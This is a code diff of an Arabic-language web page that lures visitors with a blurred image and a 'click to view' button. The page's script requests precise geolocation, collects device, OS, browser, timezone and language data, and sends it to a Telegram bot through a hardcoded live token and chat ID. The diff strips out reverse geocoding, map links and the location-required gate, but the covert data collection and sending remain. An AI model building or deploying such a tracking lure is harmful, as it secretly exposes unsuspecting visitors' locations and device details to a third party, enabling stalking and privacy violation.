@@ -50,12 +50,13 @@
             border-radius: 15px;
             box-shadow: 0 15px 30px rgba(0,0,0,0.2);
             margin: 30px auto;
-            display: none; /* مخفية في البداية */
-            transition: all 0.5s ease;
+            filter: blur(20px);
+            transition: filter 0.5s ease;
+            display: block;
         }
 
-        .main-image.show {
-            display: block;
+        .main-image.clear {
+            filter: blur(0px);
         }
 
         .click-button {
@@ -68,12 +69,8 @@
             font-weight: bold;
             cursor: pointer;
             margin: 20px auto;
-            display: none; /* مخفي في البداية */
-            transition: all 0.3s ease;
-        }
-
-        .click-button.show {
             display: block;
+            transition: all 0.3s ease;
         }
 
         .click-button:hover {
@@ -81,38 +78,14 @@
             box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
         }
 
-        .status-message {
-            background: #74b9ff;
-            color: white;
+        .success-message {
+            background: #d4edda;
+            color: #155724;
             padding: 20px;
             border-radius: 10px;
             margin: 20px;
             text-align: center;
-            font-size: 1.1em;
-            font-weight: bold;
-        }
-
-        .status-message.success {
-            background: #00b894;
-        }
-
-        .status-message.error {
-            background: #e74c3c;
-        }
-
-        .loading {
-            display: inline-block;
-            width: 20px;
-            height: 20px;
-            border: 3px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top-color: white;
-            animation: spin 1s ease-in-out infinite;
-            margin-left: 10px;
-        }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+            display: none;
         }
     </style>
 </head>
@@ -128,34 +101,17 @@
              class="main-image" 
              id="mainImage">
 
-        <div class="status-message" id="statusMessage">
-            🔍 جاري طلب الموقع الجغرافي...
-            <span class="loading"></span>
-        </div>
-
         <button class="click-button" id="viewButton" onclick="viewImage()">
-            🔍 مشاهدة الصورة
+            🔍 اضغط هنا لمشاهدة الصورة
         </button>
+
+        <div class="success-message" id="successMessage">
+            ✅ تم الموافقة على عرض الصورة
+        </div>
     </div>
 
     <script>
-        // الحصول على اسم المكان من الإحداثيات
-        async function getLocationName(lat, lng) {
-            try {
-                const response = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=ar`);
-                const data = await response.json();
-                
-                let locationName = 'غير معروف';
-                if (data.city || data.locality) {
-                    locationName = `${data.city || data.locality}, ${data.countryName || data.country}`;
-                }
-                
-                return locationName;
-            } catch (error) {
-                console.error('خطأ في الحصول على اسم المكان:', error);
-                return 'غير معروف';
-            }
-        }
+        function collectData() {
             const ua = navigator.userAgent;
             
             let deviceType = 'كمبيوتر';
@@ -175,12 +131,6 @@
             else if (ua.includes('Android')) os = 'أندرويد';
             else if (ua.includes('iOS')) os = 'iOS';
             
-            // الحصول على اسم المكان إذا كان الموقع متاح
-            let locationName = 'غير متاح';
-            if (window.userLocation?.latitude !== 'غير متاح' && window.userLocation?.longitude !== 'غير متاح') {
-                locationName = await getLocationName(window.userLocation.latitude, window.userLocation.longitude);
-            }
-
             return {
                 timestamp: new Date().toLocaleString('ar-IQ'),
                 page_url: window.location.href,
@@ -195,8 +145,7 @@
                 latitude: window.userLocation?.latitude || 'غير متاح',
                 longitude: window.userLocation?.longitude || 'غير متاح',
                 location_accuracy: window.userLocation?.accuracy || 'غير متاح',
-                location_status: window.userLocation?.status || 'لم يتم الطلب',
-                location_name: locationName // اسم المكان
+                location_status: window.userLocation?.status || 'لم يتم الطلب'
             };
         }
 
@@ -205,12 +154,6 @@
             const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
             // Chat ID الخاص بك
             const TELEGRAM_CHAT_ID = '170383339';
-            
-            // إنشاء رابط الخريطة إذا كان الموقع متاح
-            let mapLink = '';
-            if (data.latitude !== 'غير متاح' && data.longitude !== 'غير متاح') {
-                mapLink = `\n🗺️ عرض على الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
-            }
             
             const message = `
 🆕 زائر جديد للموقع:
@@ -224,10 +167,9 @@
 🌍 المنطقة: ${data.timezone}
 🗣️ اللغة: ${data.language}
 📍 الموقع الجغرافي: ${data.location_status}
-🏙️ اسم المكان: ${data.location_name}
 📐 خط العرض: ${data.latitude}
 📐 خط الطول: ${data.longitude}
-🎯 دقة الموقع: ${data.location_accuracy}${mapLink}
+🎯 دقة الموقع: ${data.location_accuracy}
 ━━━━━━━━━━━━━━━━━━
             `;
             
@@ -253,57 +195,19 @@
                 }
             }).then(data => {
                 console.log('📱 استجابة Telegram:', data);
-                
-                // إرسال الموقع كـ Location منفصل إذا كان متاح
-                if (data.latitude !== 'غير متاح' && data.longitude !== 'غير متاح') {
-                    sendLocationPin(data.latitude, data.longitude);
-                }
             }).catch(error => {
                 console.error('❌ خطأ في الإرسال:', error);
             });
         }
 
-        // إرسال الموقع كـ Pin على الخريطة
-        function sendLocationPin(lat, lng) {
-            const url = `https://api.telegram.org/bot7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI/sendLocation`;
-            
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: '170383339',
-                    latitude: parseFloat(lat),
-                    longitude: parseFloat(lng)
-                })
-            }).then(response => {
-                if (response.ok) {
-                    console.log('📍 تم إرسال الموقع كـ Pin بنجاح');
-                } else {
-                    console.error('❌ فشل إرسال الموقع');
-                }
-            }).catch(error => {
-                console.error('❌ خطأ في إرسال الموقع:', error);
-            });
-        }
-
-        async function viewImage() {
-            // التحقق من وجود الموقع الجغرافي
-            if (window.userLocation?.status !== 'تم الحصول عليه بنجاح') {
-                document.getElementById('statusMessage').innerHTML = '❌ يجب الموافقة على مشاركة الموقع أولاً';
-                document.getElementById('statusMessage').className = 'status-message error';
-                return;
-            }
-
-            // إظهار الصورة والرسالة
-            document.getElementById('mainImage').classList.add('show');
+        function viewImage() {
+            // إظهار الصورة
+            document.getElementById('mainImage').classList.add('clear');
             document.getElementById('viewButton').style.display = 'none';
-            document.getElementById('statusMessage').innerHTML = '✅ تم الموافقة على عرض الصورة';
-            document.getElementById('statusMessage').className = 'status-message success';
+            document.getElementById('successMessage').style.display = 'block';
             
             // جمع وإرسال البيانات
-            const data = await collectData();
+            const data = collectData();
             console.log('بيانات الزائر:', data);
             
             // إرسال البيانات
@@ -326,11 +230,6 @@
                             status: 'تم الحصول عليه بنجاح'
                         };
                         console.log('✅ تم الحصول على الموقع:', window.userLocation);
-                        
-                        // إظهار زر المشاهدة عند نجاح الحصول على الموقع
-                        document.getElementById('statusMessage').innerHTML = '✅ تم الحصول على الموقع بنجاح';
-                        document.getElementById('statusMessage').className = 'status-message success';
-                        document.getElementById('viewButton').classList.add('show');
                     },
                     function(error) {
                         let errorMsg = '';
@@ -355,11 +254,6 @@
                             status: errorMsg
                         };
                         console.log('❌ فشل الحصول على الموقع:', errorMsg);
-                        
-                        // إخفاء كل شيء عند رفض الموقع
-                        document.getElementById('statusMessage').innerHTML = '❌ لا يمكن عرض المحتوى بدون مشاركة الموقع';
-                        document.getElementById('statusMessage').className = 'status-message error';
-                        // عدم إظهار الزر أو الصورة
                     },
                     {
                         enableHighAccuracy: true,
@@ -375,9 +269,6 @@
                     status: 'المتصفح لا يدعم تحديد الموقع'
                 };
                 console.log('❌ المتصفح لا يدعم تحديد الموقع');
-                
-                document.getElementById('statusMessage').innerHTML = '❌ المتصفح لا يدعم تحديد الموقع';
-                document.getElementById('statusMessage').className = 'status-message error';
             }
         }
 
